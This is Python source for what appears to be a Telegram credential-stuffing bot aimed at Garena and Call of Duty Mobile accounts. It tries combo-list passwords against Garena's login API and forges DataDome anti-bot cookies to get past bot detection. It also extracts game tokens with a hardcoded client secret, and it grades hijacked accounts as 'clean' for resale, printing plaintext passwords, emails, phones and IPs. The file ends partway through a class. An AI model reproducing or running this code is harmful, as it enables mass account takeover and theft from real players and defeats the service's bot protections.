class LiveStats:
    def __init__(self):
        self.valid_count = 0
        self.invalid_count = 0
        self.clean_count = 0
        self.not_clean_count = 0
        self.has_codm_count = 0
        self.no_codm_count = 0
        self.leaked_count = 0
        self.clean_leaked_count = 0
        self.total_processed = 0
        self.level_stats = {
            '1-50': 0, '51-80': 0, '81-100': 0, '101-150': 0,
            '151-200': 0, '201-250': 0, '251-300': 0, '301+': 0
        }
        self.server_stats = {}
        self.clean_level_stats = {
            '1-50': 0, '51-80': 0, '81-100': 0, '101-150': 0,
            '151-200': 0, '201-250': 0, '251-300': 0, '301+': 0
        }
        self.clean_country_stats = {}
        self.lock = threading.Lock()
        self.checked_accounts = []

    def update_stats(self, valid=False, clean=False, has_codm=False, codm_level=None, account_line=None, leaked=False, region=None, country=None):
        with self.lock:
            self.total_processed += 1
            if account_line:
                self.checked_accounts.append(account_line)
            
            if valid:
                self.valid_count += 1
                if clean:
                    self.clean_count += 1
                else:
                    self.not_clean_count += 1
                
                if has_codm:
                    self.has_codm_count += 1
                    if codm_level:
                        try:
                            level = int(codm_level)
                            if level <= 50:
                                self.level_stats['1-50'] += 1
                            elif level <= 80:
                                self.level_stats['51-80'] += 1
                            elif level <= 100:
                                self.level_stats['81-100'] += 1
                            elif level <= 150:
                                self.level_stats['101-150'] += 1
                            elif level <= 200:
                                self.level_stats['151-200'] += 1
                            elif level <= 250:
                                self.level_stats['201-250'] += 1
                            elif level <= 300:
                                self.level_stats['251-300'] += 1
                            else:
                                self.level_stats['301+'] += 1
                        except:
                            pass
                    if clean and codm_level:
                        try:
                            level = int(codm_level)
                            if level <= 50:
                                self.clean_level_stats['1-50'] += 1
                            elif level <= 80:
                                self.clean_level_stats['51-80'] += 1
                            elif level <= 100:
                                self.clean_level_stats['81-100'] += 1
                            elif level <= 150:
                                self.clean_level_stats['101-150'] += 1
                            elif level <= 200:
                                self.clean_level_stats['151-200'] += 1
                            elif level <= 250:
                                self.clean_level_stats['201-250'] += 1
                            elif level <= 300:
                                self.clean_level_stats['251-300'] += 1
                            else:
                                self.clean_level_stats['301+'] += 1
                        except:
                            pass
                    if clean and country and country != 'N/A':
                        self.clean_country_stats[country] = self.clean_country_stats.get(country, 0) + 1
                else:
                    self.no_codm_count += 1
                
                if leaked:
                    self.leaked_count += 1
                    if clean:
                        self.clean_leaked_count += 1
            else:
                self.invalid_count += 1

    def get_stats(self):
        with self.lock:
            return {
                'valid': self.valid_count,
                'invalid': self.invalid_count,
                'clean': self.clean_count,
                'not_clean': self.not_clean_count,
                'has_codm': self.has_codm_count,
                'no_codm': self.no_codm_count,
                'leaked': self.leaked_count,
                'clean_leaked': self.clean_leaked_count,
                'total': self.total_processed,
                'checked_accounts': self.checked_accounts.copy(),
                'level_stats': self.level_stats.copy(),
                'server_stats': self.server_stats.copy(),
                'clean_level_stats': self.clean_level_stats.copy(),
                'clean_country_stats': self.clean_country_stats.copy()
            }

# ==================== CONFIGURATION ====================
CONFIG_FILE = "bot_config.ini"

def load_config():
    config = configparser.ConfigParser()
    if os.path.exists(CONFIG_FILE):
        config.read(CONFIG_FILE)
    return config

def save_config(config):
    with open(CONFIG_FILE, 'w') as f:
        config.write(f)

def get_bot_token():
    config = load_config()
    if config.has_option('BOT', 'token') and config.get('BOT', 'token'):
        return config.get('BOT', 'token')
    return None

user_combo_files = {}
user_checking_status = {}
user_tasks = {}

# ==================== WEB API CONFIGURATION ====================
WEB_API_URL_V1 = "https://v2panel.elementfx.com/"
WEB_API_URL_V2 = "https://v2panel.elementfx.com/"
WEB_API_URL = WEB_API_URL_V1

RESET = Style.RESET_ALL
WHITE = Fore.WHITE
GREEN = Fore.GREEN
YELLOW = Fore.YELLOW
RED = Fore.RED
CYAN = Fore.CYAN
BLUE = Fore.BLUE
MAGENTA = Fore.MAGENTA
BOLD = Style.BRIGHT

LEVEL_THRESHOLD = 80

# ==================== LOGGER SETUP ====================
class ColoredFormatter(logging.Formatter):
    COLORS = {
        'DEBUG': Fore.BLUE,
        'INFO': Fore.GREEN,
        'WARNING': Fore.YELLOW,
        'ERROR': Fore.RED,
        'CRITICAL': Fore.RED + Back.WHITE,
    }
    RESET = Style.RESET_ALL

    def format(self, record):
        levelname = record.levelname
        if levelname in self.COLORS:
            record.msg = f'{self.COLORS[levelname]}{record.msg}{self.RESET}'
        return super().format(record)

logger = logging.getLogger()
handler = logging.StreamHandler()
handler.setFormatter(ColoredFormatter())
logger.addHandler(handler)
logger.setLevel(logging.DEBUG)
logging.getLogger('urllib3').setLevel(logging.ERROR)
logging.getLogger('requests').setLevel(logging.ERROR)

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger_telegram = logging.getLogger(__name__)

# ==================== UTILITY FUNCTIONS ====================
def remove_duplicates_from_file(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            lines = f.readlines()
        
        seen = OrderedDict()
        for line in lines:
            line = line.strip()
            if line:
                if line not in seen:
                    seen[line] = True
        
        with open(file_path, 'w', encoding='utf-8') as f:
            for line in seen.keys():
                f.write(line + '\n')
        
        return len(seen), len(lines) - len(seen)
    except Exception as e:
        logger.error(f"Error removing duplicates: {e}")
        return 0, 0

def signal_handler(signum, frame):
    print('\n')
    print(f'  {Fore.LIGHTCYAN_EX}═══════════════════════════════════════════════════════════════════════════{Style.RESET_ALL}')
    print(f'  {Fore.YELLOW}⚠️  Interrupted by user - Exiting immediately{Style.RESET_ALL}')
    print(f'  {Fore.WHITE}   Thanks for using CØDM PRΣMIUM BØT CHECKER! - @KenshiKupalBoss{Style.RESET_ALL}')
    print(f'  {Fore.LIGHTCYAN_EX}═══════════════════════════════════════════════════════════════════════════{Style.RESET_ALL}')
    print()
    os._exit(0)

signal.signal(signal.SIGINT, signal_handler)

# ==================== ENCRYPTION FUNCTIONS ====================
def encode(plaintext, key):
    key = bytes.fromhex(key)
    plaintext = bytes.fromhex(plaintext)
    cipher = AES.new(key, AES.MODE_ECB)
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext.hex()[:32]

def get_passmd5(password):
    decoded_password = urllib.parse.unquote(password)
    return hashlib.md5(decoded_password.encode('utf-8')).hexdigest()

def hash_password(password, v1, v2):
    passmd5 = get_passmd5(password)
    inner_hash = hashlib.sha256((passmd5 + v1).encode()).hexdigest()
    outer_hash = hashlib.sha256((inner_hash + v2).encode()).hexdigest()
    return encode(passmd5, outer_hash)

def applyck(session, cookie_str):
    session.cookies.clear()
    cookie_dict = {}
    for item in cookie_str.split(';'):
        item = item.strip()
        if '=' in item:
            try:
                key, value = item.split('=', 1)
                key = key.strip()
                value = value.strip()
                if key and value:
                    cookie_dict[key] = value
            except (ValueError, IndexError):
                pass
    
    if cookie_dict:
        session.cookies.update(cookie_dict)

def get_datadome_cookie(session):
    try:
        url = 'https://dd.garena.com/js/'
        headers = {
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://account.garena.com',
            'referer': 'https://account.garena.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/129.0.0.0 Safari/537.36'
        }
        
        payload = {
            'ttst': 76.7,
            'ifov': False,
            'hc': 4,
            'br_oh': 824,
            'br_ow': 1536,
            'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/129.0.0.0 Safari/537.36',
            'wbd': False,
            'dp0': True,
            'tagpu': False,
            'npmtm': False,
            'wdifrm': False,
            'br_h': False,
            'br_w': False,
            'isf': False,
            'nddc': False,
            'rs_h': False,
            'rs_w': False,
            'rs_cd': False,
            'phe': False,
            'nm': False,
            'jsf': False,
            'lg': False,
            'en-US': False,
            'pr': False
        }
        
        data = '&'.join(f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items())
        response = session.post(url, headers=headers, data=data, timeout=15)
        response_json = response.json()
        
        if response_json.get('status') == 200 and 'cookie' in response_json:
            cookie_string = response_json['cookie']
            datadome = cookie_string.split(';')[0].split('=')[1]
            return datadome
        return None
    except Exception as e:
        logger.error(f'Error getting DataDome: {e}')
        return None

# ==================== LOGIN FUNCTIONS ====================
def prelogin(session, account, datadome_manager):
    try:
        try:
            account.encode('latin-1')
        except UnicodeEncodeError:
            logger.warning(f'   ⚠️ Skipping: {account}')
            return (None, None, None)
        
        url = 'https://sso.garena.com/api/prelogin'
        params = {
            'app_id': '10100',
            'account': account,
            'format': 'json',
            'id': str(int(time.time() * 1000))
        }
        
        retries = 2
        for attempt in range(retries):
            try:
                current_cookies = session.cookies.get_dict()
                cookie_parts = []
                for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
                    if cookie_name in current_cookies:
                        cookie_parts.append(f'{cookie_name}={current_cookies[cookie_name]}')
                
                cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
                
                headers = {
                    'accept': 'application/json, text/plain, */*',
                    'accept-encoding': 'gzip, deflate, br, zstd',
                    'accept-language': 'en-US,en;q=0.9',
                    'connection': 'keep-alive',
                    'host': 'sso.garena.com',
                    'referer': f'https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-SG&account={account}',
                    'sec-ch-ua': '"Google Chrome";v="133", "Chromium";v="133", "Not=A?Brand";v="99"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/133.0.0.0 Safari/537.36'
                }
                
                if cookie_header:
                    headers['cookie'] = cookie_header
                
                response = session.get(url, headers=headers, params=params, timeout=30)
                
                new_cookies = {}
                if 'set-cookie' in response.headers:
                    set_cookie_header = response.headers['set-cookie']
                    for cookie_str in set_cookie_header.split(','):
                        if '=' in cookie_str:
                            try:
                                cookie_name = cookie_str.split('=')[0].strip()
                                cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                                if cookie_name and cookie_value:
                                    new_cookies[cookie_name] = cookie_value
                            except Exception:
                                pass
                
                try:
                    response_cookies = response.cookies.get_dict()
                    for cookie_name, cookie_value in response_cookies.items():
                        if cookie_name not in new_cookies:
                            new_cookies[cookie_name] = cookie_value
                except Exception:
                    pass
                
                for cookie_name, cookie_value in new_cookies.items():
                    if cookie_name in ['datadome', 'apple_state_key', 'sso_key']:
                        session.cookies.set(cookie_name, cookie_value, domain='.garena.com')
                        if cookie_name == 'datadome':
                            datadome_manager.set_datadome(cookie_value)
                
                new_datadome = new_cookies.get('datadome')
                
                if response.status_code == 403:
                    return ('IP_BLOCKED', None, None)
                
                response.raise_for_status()
                data = response.json()
                
                if 'error' in data:
                    logger.error(f"      ✘ Error: {data['error']}")
                    return (None, None, new_datadome)
                else:
                    v1 = data.get('v1')
                    v2 = data.get('v2')
                    if not v1 or not v2:
                        logger.error('      ✘ Missing authentication data')
                        return (None, None, new_datadome)
                    else:
                        logger.info('   ✔ Prelogin successful')
                        return (v1, v2, new_datadome)
                        
            except json.JSONDecodeError:
                logger.error('      ✘ Invalid response format')
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
                return (None, None, None)
                
            except requests.exceptions.HTTPError as e:
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
                    
            except Exception as e:
                logger.error(f'      💥 Unexpected error: {str(e)[:50]}')
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
                return (None, None, None)
        
        return (None, None, None)
        
    except Exception as e:
        logger.error(f'      💥 Unexpected error: {str(e)[:50]}')
        return (None, None, None)

def login(session, account, password, v1, v2):
    try:
        hashed_password = hash_password(password, v1, v2)
        url = 'https://sso.garena.com/api/login'
        params = {
            'app_id': '10100',
            'account': account,
            'password': hashed_password,
            'redirect_uri': 'https://account.garena.com/',
            'format': 'json',
            'id': str(int(time.time() * 1000))
        }
        
        current_cookies = session.cookies.get_dict()
        cookie_parts = []
        for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
            if cookie_name in current_cookies:
                cookie_parts.append(f'{cookie_name}={current_cookies[cookie_name]}')
        
        cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
        
        headers = {
            'accept': 'application/json, text/plain, */*',
            'referer': 'https://account.garena.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
        }
        
        if cookie_header:
            headers['cookie'] = cookie_header
        
        response = session.get(url, headers=headers, params=params, timeout=30)
        response.raise_for_status()
        
        login_cookies = {}
        if 'set-cookie' in response.headers:
            set_cookie_header = response.headers['set-cookie']
            for cookie_str in set_cookie_header.split(','):
                if '=' in cookie_str:
                    try:
                        cookie_name = cookie_str.split('=')[0].strip()
                        cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                        if cookie_name and cookie_value:
                            login_cookies[cookie_name] = cookie_value
                    except Exception:
                        pass
        
        try:
            response_cookies = response.cookies.get_dict()
            for cookie_name, cookie_value in response_cookies.items():
                if cookie_name not in login_cookies:
                    login_cookies[cookie_name] = cookie_value
        except Exception:
            pass
        
        for cookie_name, cookie_value in login_cookies.items():
            if cookie_name in ['sso_key', 'apple_state_key', 'datadome']:
                session.cookies.set(cookie_name, cookie_value, domain='.garena.com')
        
        data = response.json()
        sso_key = login_cookies.get('sso_key') or response.cookies.get('sso_key')
        
        if 'error' in data:
            error_msg = data['error']
            if error_msg == 'ACCOUNT DOESNT EXIST':
                logger.debug(f'     ✘ Login failed: Invalid credentials for {account}')
            else:
                logger.debug(f'     ✘ Login failed: {error_msg}')
            return None
        else:
            return sso_key
            
    except json.JSONDecodeError:
        logger.debug(f'      ✘ Invalid JSON response for {account}')
        return None
    except requests.RequestException as e:
        logger.debug(f'      ✘ Login request failed: {e}')
        return None
    except Exception as e:
        logger.debug(f'      ✘ Login error: {str(e)[:50]}')
        return None

# ==================== CODM FUNCTIONS ====================
def get_codm_access_token(session):
    try:
        random_id = str(int(time.time() * 1000))
        grant_url = 'https://100082.connect.garena.com/oauth/token/grant'
        grant_headers = {
            'Host': '100082.connect.garena.com',
            'Connection': 'keep-alive',
            'sec-ch-ua-platform': '"Android"',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36; GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)',
            'Accept': 'application/json, text/plain, */*',
            'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Android WebView";v="144"',
            'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'sec-ch-ua-mobile': '?1',
            'Origin': 'https://100082.connect.garena.com',
            'X-Requested-With': 'com.garena.game.codm',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://100082.connect.garena.com/universal/oauth?client_id=100082&locale=en-US&create_grant=true&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': 'en-US,en;q=0.9'
        }
        
        device_id = f'02-{str(uuid.uuid4())}'
        grant_data = f'client_id=100082&redirect_uri=gop100082%3A%2F%2Fauth%2F&response_type=code&id={random_id}'
        
        grant_response = session.post(grant_url, headers=grant_headers, data=grant_data, timeout=15)
        grant_json = grant_response.json()
        auth_code = grant_json.get('code', '')
        
        if not auth_code:
            return ('', '', '')
        
        token_url = 'https://100082.connect.garena.com/oauth/token/exchange'
        token_headers = {
            'User-Agent': 'GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': '100082.connect.garena.com',
            'Connection': 'Keep-Alive',
            'Accept-Encoding': 'gzip'
        }
        
        token_data = f'grant_type=authorization_code&code={auth_code}&device_id={device_id}&redirect_uri=gop100082%3A%2F%2Fauth%2F&source=2&client_id=100082&client_secret=388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415'
        
        token_response = session.post(token_url, headers=token_headers, data=token_data, timeout=15)
        token_json = token_response.json()
        
        access_token = token_json.get('access_token', '')
        open_id = token_json.get('open_id', '')
        uid = token_json.get('uid', '')
        
        return (access_token, open_id, uid)
        
    except Exception as e:
        logger.error(f'Error getting CODM access token: {e}')
        return ('', '', '')

def process_codm_callback(session, access_token, open_id=None, uid=None):
    try:
        old_callback_url = f'https://api-delete-request.codm.garena.co.id/oauth/callback/?access_token={access_token}'
        old_headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36',
            'referer': 'https://auth.garena.com/'
        }
        
        old_response = session.get(old_callback_url, headers=old_headers, allow_redirects=False, timeout=15)
        location = old_response.headers.get('Location', '')
        
        if 'err=3' in location:
            return (None, 'no_codm')
        if 'token=' in location:
            token = location.split('token=')[-1].split('&')[0]
            return (token, 'success')
        
        aos_callback_url = f'https://api-delete-request-aos.codm.garena.co.id/oauth/callback/?access_token={access_token}'
        aos_headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36',
            'referer': 'https://100082.connect.garena.com/',
            'x-requested-with': 'com.garena.game.codm'
        }
        
        aos_response = session.get(aos_callback_url, headers=aos_headers, allow_redirects=False, timeout=15)
        aos_location = aos_response.headers.get('Location', '')
        
        if 'err=3' in aos_location:
            return (None, 'no_codm')
        if 'token=' in aos_location:
            token = aos_location.split('token=')[-1].split('&')[0]
            return (token, 'success')
        
        return (None, 'unknown_error')
        
    except Exception as e:
        logger.error(f'Error processing CODM callback: {e}')
        return (None, 'error')

def get_codm_user_info(session, token):
    try:
        parts = token.split('.')
        if len(parts) == 3:
            payload = parts[1]
            padding = 4 - len(payload) % 4
            if padding != 4:
                payload += '=' * padding
            decoded = base64.urlsafe_b64decode(payload)
            jwt_data = json.loads(decoded)
            user_data = jwt_data.get('user', {})
            if user_data:
                return {
                    'codm_nickname': user_data.get('codm_nickname', user_data.get('nickname', 'N/A')),
                    'codm_level': user_data.get('codm_level', 'N/A'),
                    'region': user_data.get('region', 'N/A'),
                    'uid': user_data.get('uid', 'N/A'),
                    'open_id': user_data.get('open_id', 'N/A'),
                    't_open_id': user_data.get('t_open_id', 'N/A')
                }
        
        url = 'https://api-delete-request-aos.codm.garena.co.id/oauth/check_login/'
        headers = {
            'accept': 'application/json, text/plain, */*',
            'codm-delete-token': token,
            'origin': 'https://delete-request-aos.codm.garena.co.id',
            'referer': 'https://delete-request-aos.codm.garena.co.id/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36',
            'x-requested-with': 'com.garena.game.codm'
        }
        
        response = session.get(url, headers=headers, timeout=15)
        data = response.json()
        user_data = data.get('user', {})
        
        if user_data:
            return {
                'codm_nickname': user_data.get('codm_nickname', 'N/A'),
                'codm_level': user_data.get('codm_level', 'N/A'),
                'region': user_data.get('region', 'N/A'),
                'uid': user_data.get('uid', 'N/A'),
                'open_id': user_data.get('open_id', 'N/A'),
                't_open_id': user_data.get('t_open_id', 'N/A')
            }
        else:
            return {}
            
    except Exception as e:
        logger.error(f'Error getting CODM user info: {e}')
        return {}

def check_codm_account(session, account):
    codm_info = {}
    has_codm = False
    try:
        access_token, open_id, uid = get_codm_access_token(session)
        if not access_token:
            logger.warning('      └─ ⚠️ No CODM access token')
            return (has_codm, codm_info)
        else:
            codm_token, status = process_codm_callback(session, access_token, open_id, uid)
            if status == 'no_codm':
                logger.info('      └─ 📭 No CODM detected')
                return (has_codm, codm_info)
            else:
                if status != 'success' or not codm_token:
                    logger.warning(f'      └─ ⚠️ CODM callback failed: {status}')
                    return (has_codm, codm_info)
                else:
                    codm_info = get_codm_user_info(session, codm_token)
                    if codm_info:
                        has_codm = True
                        logger.info(f"      └─ 🎮 CODM detected: Level {codm_info.get('codm_level', 'N/A')}")
    except Exception as e:
        logger.error(f'      └─ ✘ Error checking CODM: {e}')
    return (has_codm, codm_info)

# ==================== ACCOUNT PARSING ====================
def parse_account_details(data):
    user_info = data.get('user_info', {})
    
    mobile_no = user_info.get('mobile_no') or user_info.get('phone') or 'N/A'
    
    account_info = {
        'uid': user_info.get('uid', 'N/A'),
        'username': user_info.get('username', 'N/A'),
        'nickname': user_info.get('nickname', 'N/A'),
        'email': user_info.get('email', 'N/A'),
        'email_verified': user_info.get('email_v', 0) == 1,
        'personal': {
            'mobile_no': mobile_no,
            'country': user_info.get('country', 'N/A'),
            'id_card': user_info.get('id_card', 'N/A')
        },
        'security': {
            'two_step_verify': user_info.get('two_step_verify_enable', False),
            'authenticator_app': user_info.get('authenticator_enable', False),
            'facebook_connected': user_info.get('is_fbconnect_enabled', False),
            'facebook_account': user_info.get('fb_account', {}),
            'suspicious': user_info.get('suspicious', False)
        },
        'profile': {
            'shell_balance': user_info.get('shell_balance', 'N/A'),
            'avatar': user_info.get('avatar', 'N/A'),
            'avatar_url': user_info.get('avatar') or 'N/A'
        },
        'status': {
            'account_status': 'Active' if user_info.get('email_v', 0) else 'Inactive'
        },
        'binds': []
    }
    
    email = account_info['email']
    mobile_bound = False
    email_bound = False
    
    if email != 'N/A' and email and not email.startswith('***') and '@' in email and '****' not in email:
        account_info['binds'].append('Email')
        email_bound = True
    
    mobile_no = account_info['personal']['mobile_no']
    if mobile_no != 'N/A' and mobile_no and mobile_no.strip():
        account_info['binds'].append('Phone')
        mobile_bound = True
    
    if account_info['security']['facebook_connected']:
        account_info['binds'].append('Facebook')
    
    id_card = account_info['personal']['id_card']
    if id_card != 'N/A' and id_card and id_card.strip():
        account_info['binds'].append('ID Card')
    
    is_clean = (not mobile_bound and not account_info['email_verified'])
    clean_tag = "clean" if is_clean else "not_clean"
    
    if is_clean:
        account_info['is_clean'] = True
        account_info['clean_tag'] = clean_tag
        account_info['clean_status'] = "Clean"
        account_info['bind_status'] = '🧹 CLEAN - No mobile/email'
    else:
        account_info['is_clean'] = False
        account_info['clean_tag'] = clean_tag
        account_info['clean_status'] = "Not Clean"
        if account_info['binds']:
            account_info['bind_status'] = f"🔗 NOT CLEAN - Bound ({', '.join(account_info['binds'])})"
        elif email_bound:
            account_info['bind_status'] = '📧 NOT CLEAN - Email verified/bound'
        elif mobile_bound:
            account_info['bind_status'] = '📱 NOT CLEAN - Mobile number bound'
        else:
            account_info['bind_status'] = '⚠️ NOT CLEAN - Unknown reason'
    
    security_indicators = []
    if account_info['security']['two_step_verify']:
        security_indicators.append('🔒 2FA')
    if account_info['security']['authenticator_app']:
        security_indicators.append('🔐 Auth App')
    if account_info['security']['suspicious']:
        security_indicators.append('⚠️ Suspicious')
    
    account_info['security_status'] = '✅ Normal' if not security_indicators else ' | '.join(security_indicators)
    
    return account_info

def format_account_result_with_leak(account, password, details, codm_info, has_codm, leak_results):
    if not has_codm or not codm_info:
        return None
    
    codm_level_str = codm_info.get('codm_level', '0')
    try:
        codm_level = int(codm_level_str) if str(codm_level_str).isdigit() else 0
    except:
        codm_level = 0
    
    if codm_level < LEVEL_THRESHOLD:
        return None
    
    username = details.get('username', account)
    email = details.get('email', 'N/A')
    email_verified = "✅" if details.get('email_verified', False) else "❌"
    mobile = details.get('personal', {}).get('mobile_no', 'N/A')
    shell = details.get('profile', {}).get('shell_balance', 'N/A')
    country = details.get('personal', {}).get('country', 'N/A')
    last_login = details.get('last_login', 'Unknown')
    last_login_where = details.get('last_login_where', 'N/A')
    ipk = details.get('ip_for_msg', 'N/A')
    
    mobile_bound = mobile != 'N/A' and mobile and mobile.strip()
    mobile_status_icon = "📱" if mobile_bound else "❌"
    email_bound = email_verified == "✅"
    
    is_clean = (not mobile_bound and not email_bound)
    clean_emoji = "🧹" if is_clean else "⚠️"
    
    authenticator_enabled = "✅" if details.get('security', {}).get('authenticator_app') else "❌"
    two_step_enabled = "✅" if details.get('security', {}).get('two_step_verify') else "❌"
    
    fb_connected = details.get('security', {}).get('facebook_connected', False)
    facebook_status = "✅" if fb_connected else "❌"
    
    codm_nickname = codm_info.get('codm_nickname', 'N/A')
    codm_region = codm_info.get('region', 'N/A')
    uid = codm_info.get('uid', 'N/A')
    
    if codm_level >= 300:
        level_badge = "👑"
    elif codm_level >= 250:
        level_badge = "💎"
    elif codm_level >= 200:
        level_badge = "⭐"
    elif codm_level >= 150:
        level_badge = "🌟"
    elif codm_level >= 80:
        level_badge = "📈"
    else:
        level_badge = "📈"
    
    ban_risk = "⚠️ HIGH RISK" if leak_results.get('leaked') else "🟡 50/50"
    ban_message = "⚠️ Warning: This account is LEAKED! High chance of ban!" if leak_results.get('leaked') else "ℹ️ Note: Clean accounts have 50/50 ban probability depending on usage pattern."
    
    leak_section = ""
    if leak_results.get('leaked') and leak_results.get('details'):
        leak_section = f"""
║
║  <b>⚠️ LEAK INFORMATION</b>
║  ┌─────────────────────────────────┐"""
        for detail in leak_results.get('details', []):
            leak_section += f"""
║  │ {detail['source']}
║  │   └─ {detail['info']}"""
        leak_section += """
║  └─────────────────────────────────┘"""
    
    message = f"""
🎯 <b>NEW HIGH LEVEL HIT! (Level {codm_level})</b>
<b>📊 BAN RISK:</b> {ban_risk}
{ban_message}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
╔══════════════════════════════════════╗
║  <b>ACCOUNT INFORMATION</b>
╠══════════════════════════════════════╣
║ 🔐 <b>Username</b> : <code>{username}</code>
║ 🔑 <b>Password</b> : <code>{password}</code>
║ 📧 <b>Email</b> : {email} [{email_verified}]
║ 📱 <b>Mobile</b> : {mobile} [{mobile_status_icon}]
╚══════════════════════════════════════╝

╔══════════════════════════════════════╗
║  <b>LOCATION & LOGIN</b>
╠══════════════════════════════════════╣
║ 🕐 <b>Last Login</b> : {last_login}
║ 📍 <b>Login From</b> : {last_login_where}
║ 🌐 <b>IP Address</b> : {ipk}
║ 🏳️ <b>Country</b> : {country}
╚══════════════════════════════════════╝

╔══════════════════════════════════════╗
║  <b>SECURITY & BINDINGS</b>
╠══════════════════════════════════════╣
║ 💰 <b>Shells</b> : {shell}
║ 🔐 <b>2FA Enabled</b> : {two_step_enabled}
║ 📱 <b>Authenticator</b> : {authenticator_enabled}
║ 📘 <b>Facebook Linked</b> : {facebook_status}
║ 🧹 <b>Account Status</b> : {clean_emoji} {clean_emoji} {clean_emoji}
╚══════════════════════════════════════╝

╔══════════════════════════════════════╗
║  <b>CODM INFORMATION</b>
╠══════════════════════════════════════╣
║ 🎮 <b>Game</b> : CODM ({codm_region})
║ 👤 <b>Nickname</b> : <code>{codm_nickname}</code>
║ 📊 <b>Account Level</b> : <b>{codm_level}</b> {level_badge}
║ 🆔 <b>UID</b> : <code>{uid}</code>
╚══════════════════════════════════════╝
{leak_section}
<b>⚡ Checked by @KenshiKupalBoss</b>
"""
    return message

# ==================== COOKIE & DATADOME ====================
class CookieManager:
    def __init__(self):
        self.banned_cookies = set()
        self.load_banned_cookies()
        self.fresh_cookies = []
        self.load_fresh_cookies()

    def load_banned_cookies(self):
        if os.path.exists('banned_cookies.txt'):
            with open('banned_cookies.txt', 'r') as f:
                self.banned_cookies = set(line.strip() for line in f if line.strip())

    def is_banned(self, cookie):
        return cookie in self.banned_cookies

    def mark_banned(self, cookie):
        self.banned_cookies.add(cookie)
        with open('banned_cookies.txt', 'a') as f:
            f.write(cookie + '\n')

    def load_fresh_cookies(self):
        self.fresh_cookies = []
        if os.path.exists('fresh_cookie.txt'):
            with open('fresh_cookie.txt', 'r') as f:
                for line in f:
                    cookie = line.strip()
                    if cookie and not self.is_banned(cookie):
                        self.fresh_cookies.append(cookie)
        return self.fresh_cookies

    def get_valid_cookies(self):
        self.load_fresh_cookies()
        random.shuffle(self.fresh_cookies)
        return self.fresh_cookies

    def get_next_cookie(self):
        if not self.fresh_cookies:
            self.load_fresh_cookies()
        if self.fresh_cookies:
            return random.choice(self.fresh_cookies)
        return None

    def save_cookie(self, datadome_value):
        formatted_cookie = f'datadome={datadome_value.strip()}'
        if not self.is_banned(formatted_cookie):
            existing_cookies = set()
            if os.path.exists('fresh_cookie.txt'):
                with open('fresh_cookie.txt', 'r') as f:
                    existing_cookies = set(line.strip() for line in f if line.strip())
            if formatted_cookie not in existing_cookies:
                with open('fresh_cookie.txt', 'a') as f:
                    f.write(formatted_cookie + '\n')
                self.fresh_cookies.append(formatted_cookie)
                return True
        return False

class DataDomeManager:
    def __init__(self, vpn_manager=None):
        self.current_datadome = None
        self.datadome_history = []
        self._403_attempts = 0
        self._blocked = False
        self.vpn_manager = vpn_manager
        self.auto_vpn_enabled = True
        self.consecutive_403_count = 0
        self.max_consecutive_403 = 3

    def set_datadome(self, datadome_cookie):
        if datadome_cookie and datadome_cookie != self.current_datadome:
            self.current_datadome = datadome_cookie
            self.datadome_history.append(datadome_cookie)
            if len(self.datadome_history) > 10:
                self.datadome_history.pop(0)

    def get_datadome(self):
        return self.current_datadome

    def extract_datadome_from_session(self, session):
        try:
            cookies_dict = session.cookies.get_dict()
            datadome_cookie = cookies_dict.get('datadome')
            if datadome_cookie:
                self.set_datadome(datadome_cookie)
